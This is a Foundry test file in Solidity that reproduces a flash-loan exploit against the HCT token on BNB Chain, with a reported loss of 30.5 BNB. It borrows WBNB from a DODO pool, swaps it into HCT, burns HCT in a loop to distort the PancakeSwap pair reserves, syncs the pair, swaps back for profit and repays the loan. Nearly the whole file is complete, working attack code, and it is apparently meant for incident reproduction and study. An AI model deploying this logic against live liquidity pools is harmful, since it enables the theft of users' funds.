// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 30.5BNB
// Attacker : https://bscscan.com/address/0xc892d5576c65e5b0db194c1a28aa758a43bb42a5
// Attack Contract : https://bscscan.com/address/0xd7a2fc756e1053b152f90990129f94c573e006fd
// Attack Tx : https://bscscan.com/tx/0x84bd77f25cc0db493c339a187c920f104a69f89053ab2deabb93c35220e6dfc0

// @Analysis
// Twitter Guy : https://twitter.com/leovctech/status/1699775506785198499

interface ICoinToken {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function burn(uint256 _value) external;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ContractTest is Test {
    IPancakePair PancakePair = IPancakePair(0xdbE783014Cb0662c629439FBBBa47e84f1B6F2eD);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    ICoinToken HCT = ICoinToken(0x0FDfcfc398Ccc90124a0a41d920d6e2d0bD8CcF5);
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    uint256 baseAMount = 2_200_000_000_000_000_000_000;

    function setUp() public {
        vm.createSelectFork("bsc", 31_528_198 - 1);
        vm.label(address(PancakePair), "PancakePair");
        vm.label(address(router), "PancakeRouter");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(HCT), "HCT");
        vm.label(address(DPPOracle), "DPPOracle");
        approveAll();
    }

    function testExploit() external {
        uint256 startBNB = WBNB.balanceOf(address(this));
        console.log("Before Start: %d BNB", startBNB);

        DPPOracle.flashLoan(baseAMount, 0, address(this), abi.encode(baseAMount));

        uint256 intRes = WBNB.balanceOf(address(this)) / 1 ether;
        uint256 decRes = WBNB.balanceOf(address(this)) - intRes * 1e18;
        console.log("Attack Exploit: %s.%s BNB", intRes, decRes);
    }

    function DPPFlashLoanCall(address sender, uint256 amount, uint256 quoteAmount, bytes calldata data) external {
        swapWBNBtoHCT();
        burn();
        PancakePair.sync();
        swapHCTtoWBNB();
        WBNB.transfer(address(DPPOracle), baseAMount);
    }

    function swapWBNBtoHCT() internal {
        uint256 amountIn = baseAMount;
        address[] memory path = new address[](2);
        (path[0], path[1]) = (address(WBNB), address(HCT));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 1, path, address(this), type(uint256).max
        );
    }

    function burn() internal {
        while (true) {
            if (HCT.balanceOf(address(this)) <= 70) {
                break;
            }
            HCT.burn(HCT.balanceOf(address(this)) * 8 / 10 - 1);
        }
    }

    function swapHCTtoWBNB() internal {
        address[] memory path = new address[](2);
        (path[0], path[1]) = (address(HCT), address(WBNB));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HCT.balanceOf(address(this)), 10, path, address(this), type(uint256).max
        );
    }

    function approveAll() internal {
        WBNB.approve(address(router), baseAMount);
        HCT.approve(address(router), baseAMount);
    }
}
